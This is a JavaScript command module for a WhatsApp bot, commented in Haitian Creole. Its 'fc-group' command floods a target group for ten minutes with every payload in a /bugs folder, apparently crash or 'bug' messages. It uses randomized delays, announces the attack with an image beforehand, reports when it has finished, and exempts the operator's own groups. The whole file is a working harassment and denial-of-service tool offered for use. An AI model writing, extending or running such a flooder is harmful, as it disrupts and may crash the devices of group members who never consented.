const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'fc-group',
  desc: 'Flood group with all payloads from /bugs for 10 minutes',
  category: 'bug',
  react: '🔫',
  filename: __filename
}, async (bot, mek, { from, reply, isGroup }) => {
  try {
    if (!isGroup) return await reply('❌ Command sa fèt pou group sèlman.');

    const groupJid = from;

    // 🛡️ Pwoteksyon kont spam pwòp gwoup ou oswa admin
    const protectedGroups = [
      '120363025555555555@g.us' // mete groupJid ou vle pwoteje
    ];
    if (protectedGroups.includes(groupJid)) {
      return await reply('🛡️ Group sa pwoteje. Atak anile.');
    }

    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await reply('📁 Pa gen payload nan folder /bugs la.');
    }

    // ✅ Voye imaj ak detay avan atak la
    const imagePath = path.join(__dirname, '../media/5.png');
    if (fs.existsSync(imagePath)) {
      const imageBuffer = fs.readFileSync(imagePath);
      await bot.sendMessage(groupJid, {
        image: imageBuffer,
        caption: `🚨 *fc-group started on group*\n🕒 *Duration:* 10min\n⚡ *Delay:* 300–700ms\n📦 *Payloads:* ${bugFiles.length}`,
      }, { quoted: mek });
    }

    const endTime = Date.now() + 10 * 60 * 1000; // 10 minit

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, jid) => {
              await bot.sendMessage(jid, { text: msg });
            };
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, jid) => {
              await bot.sendMessage(jid, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, groupJid);
          }

        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }

        await new Promise(res => setTimeout(res, 300 + Math.floor(Math.random() * 400))); // 300–700ms
      }

      await new Promise(res => setTimeout(res, 1000)); // Delay ant sik
    }

    await bot.sendMessage(groupJid, {
      text: `✅ *fc-group attack finished*`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    await reply(`❌ Error: ${err.message}`);
  }
});
